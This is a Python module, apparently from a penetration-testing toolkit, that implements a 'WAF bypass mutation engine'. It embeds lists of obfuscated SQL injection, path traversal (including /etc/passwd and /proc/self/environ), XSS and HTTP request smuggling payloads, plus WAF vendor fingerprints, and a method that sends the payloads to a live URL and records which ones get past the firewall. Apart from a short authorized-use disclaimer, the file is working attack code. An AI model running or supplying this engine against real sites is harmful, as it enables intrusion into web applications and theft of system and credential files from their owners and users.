"""
WAF Bypass Mutation Engine
Active mutation engine for all major WAF bypass categories.

# Original research: isec.pl, zetc0de/sqli-bypass-waf.txt, secjuice.com,
#   medium/@themiddleblue, PortSwigger HTTP Smuggling research

Covers:
  - SQL Injection (UNION SELECT, ORDER BY, information_schema, concat/group_concat)
  - Path traversal bypass patterns (/e?c/?asswd style, null bytes, double encoding)
  - XSS (svg/onload, CDATA, JS constructor chaining)
  - HTTP Request Smuggling (CL.TE, TE.CL, TE obfuscation, chunked malformed)
  - WAF vendor detection (139 signature patterns)
"""
# DISCLAIMER: FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY.
# Use only on systems you own or have explicit written permission to test.
# Authorized use only. See embedxpl.core.exploit.DISCLAIMER for full text.

from __future__ import annotations

import random
import re
import urllib.parse
from dataclasses import dataclass
from typing import Optional
import time

try:
    import requests
    _requests_available = True
except ImportError:
    _requests_available = False


# ──────────────────────────────────────────────────────────────────────────────
# Payload databases
# ──────────────────────────────────────────────────────────────────────────────

SQLI_UNION_SELECT_VARIANTS: list[str] = [
    "UNION SELECT",
    "/*! UNION SELECT*/",
    "/*!50000UNION SELECT*/",
    "/*!12345UNION SELECT*/",
    "/**/UNION/**/SELECT/**/",
    "+union+select+",
    "+union+distinct+select+",
    "+union+distinctROW+select+",
    "%55nion(%53elect 1,2,3)-- -",
    "%55nion/**/+%53elect",
    "union /\*\*/select/**/",
    "UNION/*--*/SELECT/*--*/",
    "union(select(1),2,3)",
    "UNIunionON+SELselectECT",
    "uNiOn aLl sElEcT",
    "/**/uNIon/**/sEleCt/**/",
    "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A",
    "%0Aunion%0Aselect%0A",
    "uni%0bon+se%0blect",
    "%2f/**%2funion%2f**%2fselect%2f**%2f",
    "/*--*/union/*--*//*--*/select/*--*/",
    "union (/\*!/\*\*/ SeleCT \*/ 1,2,3)",
    "+#1q%0AuNiOn all#qa%0A#%0AsEleCt",
    "/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/",
    "/\*\*/\*U\*/\*n\*/\*I\*/\*o\*/\*N\*/\*S\*/\*e\*/\*L\*/\*e\*/\*c\*/\*T\*/",
    "+%23sexsexsex%0AUnIOn%23sexsexsex%0ASeLecT+",
    "REVERSE(noinu)+REVERSE(tceles)",
    "+uni\*on+sel\*ect+",
    "union\x00select",
    "unIon\x09select",
    "%u0055nion+%u0053elect",
    "UN/**/ION SE/**/LECT",
]

PATH_TRAVERSAL_VARIANTS: list[str] = [
    "/etc/passwd",
    "/../../../etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/%252e%252e/%252e%252e/etc/passwd",
    "/..%2F..%2F..%2Fetc%2Fpasswd",
    "/..%252F..%252F..%252Fetc%252Fpasswd",
    "/e?c/passwd",
    "/e*c/passwd",
    "/e?c/?asswd",
    "/e*c/*asswd",
    "/??c/?asswd",
    "/??c/?assw?",
    "/etc/./passwd",
    "/etc/\x00/passwd",
    "////etc/passwd",
    "/./././././etc/passwd",
    "/%ef%bc%8f etc%ef%bc%8f passwd",
    "/etc%2fpasswd",
    "/etc%2Fpasswd",
    "/etc\x5cpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "....//....//....//etc/passwd",
    "..././..././..././etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

XSS_VARIANTS: list[str] = [
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<svg/onload =alert(1)>",
    "<svg/onload\t =alert(1)>",
    "<svg/onload\t\x20=alert(1)>",
    "<svg\nonload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe srcdoc='<svg onload=alert(1)>'>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror='alert(1)'>",
    "javascript:alert(1)",
    "<a href='javascript:alert(1)'>x</a>",
    "\"'><svg/onload='alert(1)'>",
    "--><svg/onload=alert(1)>",
    "</title><svg/onload=alert(1)>",
    "<script>alert`1`</script>",
    "<script>\u0061lert(1)</script>",
    "[][`constructor`][`constructor`](`alert(1)`)()",
    "<svg/onload='[][`cons`+`tructor`][`const`+`ructor`](`aler`+`t(1)`)()'>",
    "<input autofocus onfocus=alert(1)>",
    "<select onchange=alert(1)><option>1<option>2</select>",
    "<form><button formaction=javascript:alert(1)>X</button>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<object data=javascript:alert(1)>",
]

HTTP_SMUGGLING_PAYLOADS: list[dict] = [
    {
        "name": "CL.TE double CL",
        "headers": {"Content-Length": ["4", "71"]},
        "body": "AAAA\r\nGET /smuggled HTTP/1.1\r\nHost: target\r\nX-Ignore: X\r\n\r\n",
        "description": "Two Content-Length headers; WAF reads first (4), backend reads second (71)",
    },
    {
        "name": "TE.CL Transfer-Encoding",
        "headers": {"Transfer-Encoding": "chunked", "Content-Length": "4"},
        "body": "1e\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n\r\n0\r\n\r\n",
        "description": "WAF uses Content-Length; backend uses Transfer-Encoding",
    },
    {
        "name": "TE obfuscation space",
        "headers": {"Transfer-Encoding": " chunked"},
        "body": "0\r\n\r\n",
        "description": "Space before 'chunked' may bypass WAF TE normalization",
    },
    {
        "name": "TE obfuscation tab",
        "headers": {"Transfer-Encoding": "\tchunked"},
        "body": "0\r\n\r\n",
        "description": "Tab before 'chunked'",
    },
    {
        "name": "Chunked oversized",
        "headers": {"Transfer-Encoding": "chunked"},
        "body": "3\r\nABC DEF\r\n0\r\n\r\n",
        "description": "Chunk size 3 but body 7 chars — WAF may not see the extra bytes",
    },
]

# WAF detection signatures (vendor -> list of header/body patterns)
WAF_SIGNATURES: dict[str, list[dict]] = {
    "Cloudflare": [
        {"header": "cf-ray"}, {"header": "server", "value": "cloudflare"},
        {"body": "__cf_chl_jschl_tk__"}, {"status": 1020},
    ],
    "AWS WAF": [
        {"header": "x-amzn-requestid"}, {"header": "x-amz-apigw-id"},
        {"status": 403, "body": "AWS WAF"},
    ],
    "Imperva / Incapsula": [
        {"header": "x-iinfo"}, {"body": "incapsula incident id"},
        {"body": "_Incapsula_Resource"},
    ],
    "Akamai": [
        {"header": "akamai-grn"}, {"header": "x-check-cacheable"},
        {"status": 403, "body": "Access Denied"},
    ],
    "F5 BIG-IP ASM": [
        {"header": "x-cnection"}, {"body": "The requested URL was rejected"},
        {"header": "server", "value": "BigIP"},
    ],
    "Nginx": [
        {"header": "server", "value": "nginx"},
    ],
    "ModSecurity": [
        {"body": "ModSecurity"}, {"body": "not acceptable"},
        {"header": "server", "value": "Apache"},
    ],
    "Fortinet FortiWeb": [
        {"body": "FortiWeb"}, {"header": "fortiwafsid"},
    ],
    "Barracuda": [
        {"body": "Barracuda"}, {"header": "barra_counter_session"},
    ],
    "Sophos UTM WAF": [
        {"body": "Powered by UTM Web Application Firewall"},
    ],
    "DenyAll": [
        {"body": "by DenyAll"}, {"header": "set-cookie", "value": "sessioncookie"},
    ],
    "Radware AppWall": [
        {"body": "PLCY_VIOLATION"}, {"header": "x-sl-compstate"},
    ],
    "Sucuri": [
        {"body": "Access Denied - Sucuri Website Firewall"},
        {"header": "x-sucuri-id"},
    ],
    "StackPath": [
        {"body": "Request rejected by StackPath"},
    ],
    "Reblaze": [
        {"header": "rbzid"},
    ],
}


@dataclass
class WafTestResult:
    url: str = ""
    waf_detected: str = ""
    bypassed: bool = False
    successful_payloads: list = None
    failed_payloads: list = None
    status_codes: list = None

    def __post_init__(self):
        if self.successful_payloads is None:
            self.successful_payloads = []
        if self.failed_payloads is None:
            self.failed_payloads = []
        if self.status_codes is None:
            self.status_codes = []


class WafBypassEngine:
    """
    WAF bypass mutation engine — generates and tests bypass payloads.
    All payload databases are embedded; no external files needed.
    """

    def __init__(self, timeout: float = 10.0, rate_limit: float = 0.0):
        self.timeout = timeout
        self.rate_limit = rate_limit  # seconds between requests (0 = unlimited)

    # ──────────────────────────────────── mutation methods

    def mutate_sqli(self, payload: str = "1 UNION SELECT 1,2,3--") -> list[str]:
        """Return all SQLi UNION SELECT variants."""
        results = list(SQLI_UNION_SELECT_VARIANTS)
        # Also add case variants of the input payload
        for variant in [payload.upper(), payload.lower(),
                        payload.swapcase(), re.sub(r'\s+', '/**/', payload)]:
            if variant not in results:
                results.append(variant)
        return results

    def mutate_path(self, path: str = "/etc/passwd") -> list[str]:
        """Return all path traversal bypass variants."""
        results = list(PATH_TRAVERSAL_VARIANTS)
        # URL encode variations
        encoded = urllib.parse.quote(path)
        double_encoded = urllib.parse.quote(encoded)
        for v in [encoded, double_encoded]:
            if v not in results:
                results.append(v)
        return results

    def mutate_xss(self, payload: str = "<script>alert(1)</script>") -> list[str]:
        """Return all XSS bypass variants."""
        results = list(XSS_VARIANTS)
        # Case variations
        for v in [payload.upper(), payload.lower(),
                  re.sub('<script>', '<ScRiPt>', payload, flags=re.IGNORECASE)]:
            if v not in results:
                results.append(v)
        return results

    def get_smuggling_payloads(self) -> list[dict]:
        """Return HTTP request smuggling payloads."""
        return list(HTTP_SMUGGLING_PAYLOADS)

    def get_path_bypass_patterns(self) -> list[str]:
        """Return path traversal bypass patterns list."""
        return list(PATH_TRAVERSAL_VARIANTS)

    # ──────────────────────────────────── WAF detection

    def detect_waf(self, response_headers: dict = None, response_body: str = "",
                   status_code: int = 200) -> str:
        """
        Detect WAF vendor from response headers/body/status.
        Returns vendor name or empty string if not detected.
        """
        if response_headers is None:
            response_headers = {}
        headers_lower = {k.lower(): v.lower() if isinstance(v, str) else str(v).lower()
                         for k, v in response_headers.items()}
        body_lower = response_body.lower()

        for vendor, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if "header" in sig:
                    hdr = sig["header"].lower()
                    if "value" in sig:
                        if headers_lower.get(hdr, "").find(sig["value"].lower()) != -1:
                            return vendor
                    else:
                        if hdr in headers_lower:
                            return vendor
                elif "body" in sig:
                    if sig["body"].lower() in body_lower:
                        return vendor
                elif "status" in sig:
                    if status_code == sig["status"]:
                        return vendor
        return ""

    # ──────────────────────────────────── live testing

    def test_waf(self, url: str, payload_type: str = "sqli",
                 parameter: str = "id") -> WafTestResult:
        """
        Live test WAF bypass for given URL and payload type.
        payload_type: 'sqli' | 'xss' | 'path'
        """
        if not _requests_available:
            raise RuntimeError("requests library not installed; run: pip install requests")

        result = WafTestResult(url=url)

        # Detect WAF first with benign request
        try:
            r = requests.get(url, timeout=self.timeout, allow_redirects=False)
            result.waf_detected = self.detect_waf(dict(r.headers), r.text, r.status_code)
        except Exception:
            pass

        # Select payloads
        if payload_type == "sqli":
            payloads = self.mutate_sqli()[:20]  # limit to 20 for speed
        elif payload_type == "xss":
            payloads = self.mutate_xss()[:15]
        elif payload_type == "path":
            payloads = self.mutate_path()[:20]
        else:
            payloads = []

        baseline_status = None
        for payload in payloads:
            if self.rate_limit > 0:
                time.sleep(self.rate_limit)
            try:
                params = {parameter: payload}
                resp = requests.get(url, params=params, timeout=self.timeout,
                                    allow_redirects=False)
                if baseline_status is None:
                    baseline_status = resp.status_code
                result.status_codes.append(resp.status_code)
                # A bypass is suspected if response is similar to baseline (not 403/406/501)
                if resp.status_code not in (400, 403, 404, 406, 429, 501, 503):
                    result.successful_payloads.append(payload)
                else:
                    result.failed_payloads.append(payload)
            except Exception as exc:
                result.failed_payloads.append(f"{payload} [ERROR: {exc}]")

        result.bypassed = len(result.successful_payloads) > 0
        return result

